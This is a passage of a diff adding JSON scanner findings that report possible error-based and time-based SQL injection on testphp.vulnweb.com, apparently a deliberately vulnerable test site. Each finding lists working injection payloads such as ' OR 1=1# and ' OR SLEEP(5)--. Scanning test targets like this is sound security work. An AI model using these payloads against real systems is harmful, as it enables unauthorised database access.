+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/disclaimer.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/disclaimer.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/cart.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/cart.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/cart.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/guestbook.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible Error-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
+    "payload": "'",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible Time-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/login.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible Error-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
+    "payload": "'",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible Time-based SQLi in field 'uname' at http://testphp.vulnweb.com/userinfo.php",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Error-based SQLi",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible Error-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "' OR 1=1#",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible Time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "'; WAITFOR DELAY '00:00:05'--",
+    "method": "POST",
+    "error_signature": "You have an error in your SQL syntax",
+    "severity": "critical"
+  },
+  {
+    "type": "SQL Injection",
+    "subtype": "Time-based SQLi (Timeout)",
+    "url": "http://testphp.vulnweb.com/userinfo.php",
+    "details": "Possible time-based SQLi in field 'searchFor' at http://testphp.vulnweb.com/search.php?test=query (timeout)",
+    "payload": "' OR SLEEP(5)--",
+    "method": "POST",
+    "error_signature": "Request timeout",
+    "severity": "critical"
   }
-}
-[0m
+]
